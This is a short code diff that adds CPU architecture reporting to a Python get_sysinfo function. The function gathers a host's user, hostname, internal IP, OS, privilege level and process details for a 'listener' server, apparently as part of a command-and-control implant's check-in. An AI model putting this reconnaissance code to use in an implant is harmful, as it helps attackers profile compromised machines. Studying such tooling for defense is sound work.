@@ -1,4 +1,5 @@
 import os
+import platform
 import sys
 import pwd
 import socket
@@ -7,7 +8,7 @@ import subprocess
 def get_sysinfo(nonce='00000000'):
     # NOTE: requires global variable "server" to be set
 
-    # nonce | listener | domainname | username | hostname | internal_ip | os_details | os_details | high_integrity | process_name | process_id | language | language_version
+    # nonce | listener | domainname | username | hostname | internal_ip | os_details | os_details | high_integrity | process_name | process_id | language | language_version | architecture
     __FAILED_FUNCTION = '[FAILED QUERY]'
 
     try:
@@ -50,6 +51,10 @@ def get_sysinfo(nonce='00000000'):
         pyVersion = "%s.%s" % (temp[0], temp[1])
     except Exception as e:
         pyVersion = __FAILED_FUNCTION
+    try:
+        architecture = platform.machine()
+    except Exception as e:
+        architecture = __FAILED_FUNCTION
 
     language = 'python'
     cmd = 'ps %s' % (os.getpid())
@@ -60,4 +65,4 @@ def get_sysinfo(nonce='00000000'):
         processName = b" ".join(parts[1].split()[4:])
     else:
         processName = 'python'
-    return "%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s" % (nonce, server, '', username, hostname, internalIP, osDetails, highIntegrity, processName.decode('UTF-8'), processID, language, pyVersion)
+    return "%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s" % (nonce, server, '', username, hostname, internalIP, osDetails, highIntegrity, processName.decode('UTF-8'), processID, language, pyVersion, architecture)
